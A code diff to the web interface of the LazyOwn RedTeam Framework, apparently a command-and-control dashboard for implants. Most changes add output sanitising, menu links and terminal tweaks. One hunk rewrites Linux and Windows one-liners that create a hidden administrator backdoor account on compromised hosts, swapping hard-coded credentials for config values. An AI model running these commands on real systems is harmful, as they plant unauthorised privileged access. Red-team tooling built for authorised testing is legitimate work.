@@ -184,6 +184,14 @@
                         <span>Rep Bot</span>
                         <a href="#"><img src="/static/Mac-icon.png"/></a>
                     </li>
+                    <li id="reportNewButton">
+                        <span>Report</span>
+                        <a href="/lazyreport" target="_blank"><img src="/static/Mac-icon.png"/></a>
+                    </li>
+                    <li id="killchainButton">
+                        <span>Kill-Chain</span>
+                        <a href="/killchain" target="_blank"><img src="/static/Mac-icon.png"/></a>
+                    </li>
                 </ul>
 
                 <p class="neon-text">&copy; 2025 LazyOwn RedTeam. All rights GPLv3.</p>
@@ -225,6 +233,16 @@
             var termSocket = null;
             var termInitialized = false;
 
+            function safeHtml(dirty) {
+                var text = String(dirty === null || dirty === undefined ? '' : dirty);
+                if (typeof DOMPurify !== 'undefined' && DOMPurify.sanitize) {
+                    return DOMPurify.sanitize(text);
+                }
+                var div = document.createElement('div');
+                div.textContent = text;
+                return div.innerHTML;
+            }
+
             function initTerminal() {
                 if (termInitialized) {
                     fitAddon.fit();
@@ -234,6 +252,7 @@
                 term = new Terminal({
                     cursorBlink: true,
                     fontFamily: 'monospace',
+                    scrollback: 5000,
                     theme: {
                         background: '#000000',
                         foreground: '#00FF00'
@@ -242,17 +261,18 @@
                 fitAddon = new FitAddon.FitAddon();
                 term.loadAddon(fitAddon);
                 term.open(document.getElementById('terminal'));
-                term.writeln("Welcome to LazyOwn RedTeam Framework: CRIMEN 👋");
+                term.write("Welcome to LazyOwn RedTeam Framework: CRIMEN 👋\r\n");
                 fitAddon.fit();
                 termSocket = io("/pty", { transports: ["websocket"] });
                 termSocket.on("connect", () => {
-                    term.writeln("\r\n\x1b[32m[ws] connected to /pty (id=" + termSocket.id + ")\x1b[0m");
+                    term.write("[ws] connected to /pty (id=" + termSocket.id + ")\r\n");
+                    termSocket.emit("resize", { rows: term.rows, cols: term.cols });
                 });
                 termSocket.on("connect_error", (err) => {
-                    term.writeln("\r\n\x1b[31m[ws] connect_error: " + err.message + "\x1b[0m");
+                    term.write("[ws] connect_error: " + err.message + "\r\n");
                 });
                 termSocket.on("disconnect", (reason) => {
-                    term.writeln("\r\n\x1b[33m[ws] disconnect: " + reason + "\x1b[0m");
+                    term.write("[ws] disconnect: " + reason + "\r\n");
                 });
                 termSocket.on("pty-output", (data) => {
                     term.write(data.output);
@@ -434,7 +454,7 @@
 
                     spinner.style.display = 'none';
                     if (data.error) {
-                        outputDiv.innerHTML += `<p style="color: red;">${data.error}</p>`;
+                        outputDiv.innerHTML += `<p style="color: red;">${safeHtml(data.error)}</p>`;
                         term.write('\r\n' + '\x1b[31m' + data.error + '\x1b[0m');
                     } else {
                         toastr('<h1>Command:' + command + "</h1>")
@@ -478,7 +498,7 @@
                         formGeneral_bot(cleanOutputText);
                     }
                     //outputDiv.innerHTML += `<p>${cleanOutputText}</p>`;
-                    outputAtomic.innerHTML += `<p>${cleanOutputText}</p>`;
+                    outputAtomic.innerHTML += `<p>${safeHtml(cleanOutputText)}</p>`;
                 } catch (error) {
 
                 }
@@ -625,7 +645,7 @@
                             try {
                                 const data = JSON.parse(chunk);
                                 if (data.response) {
-                                    responseDiv.innerHTML +=  data.response;
+                                    responseDiv.innerHTML += safeHtml(data.response);
                                 }
                             } catch (e) {
 
@@ -638,7 +658,7 @@
                         try {
                             const data = JSON.parse(buffer);
                             if (data.response) {
-                                responseDiv.innerHTML += data.response;
+                                responseDiv.innerHTML += safeHtml(data.response);
                             }
                         } catch (e) {
 
@@ -681,7 +701,7 @@
                             try {
                                 const data = JSON.parse(chunk);
                                 if (data.response) {
-                                    responseDiv.innerHTML +=  data.response;
+                                    responseDiv.innerHTML += safeHtml(data.response);
                                 }
                             } catch (e) {
 
@@ -694,7 +714,7 @@
                         try {
                             const data = JSON.parse(buffer);
                             if (data.response) {
-                                responseDiv.innerHTML += data.response;
+                                responseDiv.innerHTML += safeHtml(data.response);
                             }
                         } catch (e) {
 
@@ -750,7 +770,7 @@
 
                         var converter = new showdown.Converter();
                         var html = converter.makeHtml(data.response);
-                        document.getElementById('vulnResponse').innerHTML += `<p>${html}</p>`;
+                        document.getElementById('vulnResponse').innerHTML += `<p>${safeHtml(html)}</p>`;
                         if (data.response) {
 
 
@@ -760,7 +780,7 @@
                 .catch(error => {
                     spinner.style.display = 'none';
 
-                    document.getElementById('vulnResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
+                    document.getElementById('vulnResponse').innerHTML += `<p style="color: red;">Error de red: ${safeHtml(error.message)}</p>`;
                 });
             }
             function closePopup(self) {
@@ -847,8 +867,8 @@
                         } else {
                             var converter = new showdown.Converter();
                             var html = converter.makeHtml(data.response);
-                            document.getElementById('generalResponse').innerHTML += `<p>${html}</p>`;
-                            document.getElementById('outputIA').innerHTML += `<p>${html}</p>`;
+                            document.getElementById('generalResponse').innerHTML += `<p>${safeHtml(html)}</p>`;
+                            document.getElementById('outputIA').innerHTML += `<p>${safeHtml(html)}</p>`;
 
 
                             if (data.response) {
@@ -860,7 +880,7 @@
                     .catch(error => {
                         spinner.style.display = 'none';
 
-                        document.getElementById('generalResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
+                        document.getElementById('generalResponse').innerHTML += `<p style="color: red;">Error de red: ${safeHtml(error.message)}</p>`;
                     });
             }
             toastr(bot)
@@ -997,10 +1017,10 @@
                     const clientId = document.getElementById('client_id').value;
                     os = document.getElementById(clientId).value;
                     if(os === "Linux"){
-                        command = "useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0"
+                        command = "useradd -m -d /home/." + "{{ config.backdoor_username | default('lazyown') }}" + " -s /bin/bash " + "{{ config.backdoor_username | default('lazyown') }}" + " && echo '" + "{{ config.backdoor_username | default('lazyown') }}:" + "{{ config.backdoor_password | default('CHANGE_ME') }}" + "' | chpasswd && usermod -aG sudo " + "{{ config.backdoor_username | default('lazyown') }}" + " && chmod 700 /home/." + "{{ config.backdoor_username | default('lazyown') }}" + " && sudo usermod -aG sudo " + "{{ config.backdoor_username | default('lazyown') }}" + " && su - " + "{{ config.backdoor_username | default('lazyown') }}"
                     }
                     if(os === "Windows"){
-                        command = "powershell $userExists = Get-LocalUser -Name 'grisun0' -ErrorAction SilentlyContinue; if ($userExists) { Write-Output 'User grisun0 already exists.' } else { $password = 'Grisgrisgris123!'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; New-LocalUser -Name 'grisun0' -Password $securePassword -FullName 'Grisun0 User' -Description 'Grisun0 User'; }; $group = Get-LocalGroup -Name 'Administrators' -ErrorAction SilentlyContinue; if ($group) { Add-LocalGroupMember -Group 'Administrators' -Member 'grisun0' } else { Write-Output 'Group Administrators was not found.' }; Start-Process powershell -Verb runAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process cmd.exe -Verb runAs -ArgumentList \"/C runas /user:grisun0 cmd.exe\"`\"' ; net localgroup administrators grisun0 /add"
+                        command = "powershell $userExists = Get-LocalUser -Name '" + "{{ config.backdoor_username | default('lazyown') }}" + "' -ErrorAction SilentlyContinue; if ($userExists) { Write-Output 'User {{ config.backdoor_username | default('lazyown') }} already exists.' } else { $password = '{{ config.backdoor_password | default('CHANGE_ME') }}'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; New-LocalUser -Name '{{ config.backdoor_username | default('lazyown') }}' -Password $securePassword -FullName 'LazyOwn User' -Description 'LazyOwn User'; }; $group = Get-LocalGroup -Name 'Administrators' -ErrorAction SilentlyContinue; if ($group) { Add-LocalGroupMember -Group 'Administrators' -Member '{{ config.backdoor_username | default('lazyown') }}' } else { Write-Output 'Group Administrators was not found.' }; Start-Process powershell -Verb runAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process cmd.exe -Verb runAs -ArgumentList \"/C runas /user:{{ config.backdoor_username | default('lazyown') }} cmd.exe\"`\"' ; net localgroup administrators {{ config.backdoor_username | default('lazyown') }} /add"
                     }
                     RunRemoteCmd(clientId,command);
                 });
@@ -1112,17 +1132,28 @@
 
                     connectedClients.forEach(function(client) {
                         var clientData = results[client] ? results[client][0] : null;
-                        if (!clientData) return;
 
                         var label = "Implant ID: " + client;
                         var image = '/static/client.png';
-                        var client_os = clientData.os;
-                        var ips = clientData.ips;
-                        var pid = clientData.pid;
-                        var user = clientData.user;
-                        var hostname = clientData.hostname;
-                        var client_discovered_ips = clientData.discovered_ips;
-                        var client_result_portscan = clientData.result_portscan;
+                        var client_os = '';
+                        var ips = '';
+                        var pid = '';
+                        var user = '';
+                        var hostname = '';
+                        var client_discovered_ips = '';
+                        var client_result_portscan = '';
+
+                        if (clientData) {
+                            client_os = clientData.os;
+                            ips = clientData.ips;
+                            pid = clientData.pid;
+                            user = clientData.user;
+                            hostname = clientData.hostname;
+                            client_discovered_ips = clientData.discovered_ips;
+                            client_result_portscan = clientData.result_portscan;
+                        } else {
+                            label += " (polling...)";
+                        }
 
                         if (client_os) {
                             label += " (OS/" + client_os + ")";
@@ -1408,11 +1439,11 @@
                     .then(response => response.json())
                     .then(data => {
                         spinner.style.display = 'none';
-                        document.getElementById('response').innerHTML = '<div class="alert alert-success" role="alert">' + data.response + '</div>';
+                        document.getElementById('response').innerHTML = '<div class="alert alert-success" role="alert">' + DOMPurify.sanitize(data.response) + '</div>';
                     })
                     .catch(error => {
                         spinner.style.display = 'none';
-                        document.getElementById('response').innerHTML = '<div class="alert alert-danger" role="alert">' + error.message + '</div>';
+                        document.getElementById('response').innerHTML = '<div class="alert alert-danger" role="alert">' + DOMPurify.sanitize(error.message) + '</div>';
                     });
                 });
 
@@ -1479,10 +1510,10 @@
                         spinner.style.display = 'none';
                         if (data.error) {
 
-                            document.getElementById('chatbotResponse').innerHTML += `<p style="color: red;">${data.error}</p>`;
+                            document.getElementById('chatbotResponse').innerHTML += `<p style="color: red;">${safeHtml(data.error)}</p>`;
                         } else {
 
-                            document.getElementById('chatbotResponse').innerHTML += `<p>${data.response}</p>`;
+                            document.getElementById('chatbotResponse').innerHTML += `<p>${safeHtml(data.response)}</p>`;
                             if (data.response) {
                                 const userWantsToRun = confirm('Do you want to run the command? \n' + data['response']);
                                 if (userWantsToRun) {
@@ -1503,14 +1534,14 @@
                                         issueCommand(clientChoice, data['response']);
                                     }
                                 }
-                                document.getElementById('chatbotResponse').innerHTML += `<pre>${data.output}</pre>`;
+                                document.getElementById('chatbotResponse').innerHTML += `<pre>${safeHtml(data.output)}</pre>`;
                             }
                         }
                     })
                     .catch(error => {
                         spinner.style.display = 'none';
 
-                        document.getElementById('chatbotResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
+                        document.getElementById('chatbotResponse').innerHTML += `<p style="color: red;">Error de red: ${safeHtml(error.message)}</p>`;
                     });
 
                     document.getElementById('chatbotInput').value = '';
@@ -1538,11 +1569,11 @@
                         spinner.style.display = 'none';
                         if (data.error) {
 
-                            document.getElementById('scriptResponse').innerHTML += `<p style="color: red;">${data.error}</p>`;
+                            document.getElementById('scriptResponse').innerHTML += `<p style="color: red;">${safeHtml(data.error)}</p>`;
                         } else {
                             var converter = new showdown.Converter();
                             var html = converter.makeHtml(data.response);
-                            document.getElementById('scriptResponse').innerHTML += `<p>${html}</p>`;
+                            document.getElementById('scriptResponse').innerHTML += `<p>${safeHtml(html)}</p>`;
                             if (data.response) {
 
                                 //document.getElementById('scriptResponse').innerHTML += `<pre>${data.output}</pre>`;
@@ -1552,7 +1583,7 @@
                     .catch(error => {
                         spinner.style.display = 'none';
 
-                        document.getElementById('scriptResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
+                        document.getElementById('scriptResponse').innerHTML += `<p style="color: red;">Error de red: ${safeHtml(error.message)}</p>`;
                     });
 
                     document.getElementById('scriptInput').value = '';
@@ -1605,12 +1636,12 @@
 
                         if (data.error) {
 
-                            document.getElementById('searchResponse').innerHTML += `<p style="color: red;">${data.error}</p>`;
+                            document.getElementById('searchResponse').innerHTML += `<p style="color: red;">${safeHtml(data.error)}</p>`;
                         } else {
 
                             var converter = new showdown.Converter();
                             var html = converter.makeHtml(data.response);
-                            document.getElementById('searchResponse').innerHTML += `<p>${html}</p>`;
+                            document.getElementById('searchResponse').innerHTML += `<p>${safeHtml(html)}</p>`;
                             if (data.response) {
 
 
@@ -1620,7 +1651,7 @@
                     .catch(error => {
                         spinner.style.display = 'none';
 
-                        document.getElementById('searchResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
+                        document.getElementById('searchResponse').innerHTML += `<p style="color: red;">Error de red: ${safeHtml(error.message)}</p>`;
                     });
 
 
@@ -1647,12 +1678,12 @@
                         spinner.style.display = 'none';
                         if (data.error) {
 
-                            document.getElementById('redopResponse').innerHTML += `<p style="color: red;">${data.error}</p>`;
+                            document.getElementById('redopResponse').innerHTML += `<p style="color: red;">${safeHtml(data.error)}</p>`;
                         } else {
 
                             var converter = new showdown.Converter();
                             var html = converter.makeHtml(data.response);
-                            document.getElementById('redopResponse').innerHTML += `<p>${html}</p>`;
+                            document.getElementById('redopResponse').innerHTML += `<p>${safeHtml(html)}</p>`;
                             if (data.response) {
 
                                 //document.getElementById('redopResponse').innerHTML += `<pre>${data.output}</pre>`;
@@ -1662,7 +1693,7 @@
                     .catch(error => {
                         spinner.style.display = 'none';
 
-                        document.getElementById('redopResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
+                        document.getElementById('redopResponse').innerHTML += `<p style="color: red;">Error de red: ${safeHtml(error.message)}</p>`;
                     });
 
 
@@ -1689,11 +1720,11 @@
 
                         spinner.style.display = 'none';
                         if (data.error) {
-                            document.getElementById('taskResponse').innerHTML += `<p style="color: red;">${data.error}</p>`;
+                            document.getElementById('taskResponse').innerHTML += `<p style="color: red;">${safeHtml(data.error)}</p>`;
                         } else {
                             var converter = new showdown.Converter();
                             var html = converter.makeHtml(data.response);
-                            document.getElementById('taskResponse').innerHTML += `<p>${html}</p>`;
+                            document.getElementById('taskResponse').innerHTML += `<p>${safeHtml(html)}</p>`;
                             if (data.response) {
 
                                 //document.getElementById('taskResponse').innerHTML += `<pre>${data.output}</pre>`;
@@ -1703,7 +1734,7 @@
                     .catch(error => {
                         spinner.style.display = 'none';
 
-                        document.getElementById('taskResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
+                        document.getElementById('taskResponse').innerHTML += `<p style="color: red;">Error de red: ${safeHtml(error.message)}</p>`;
                     });
 
                     fetchTasks();
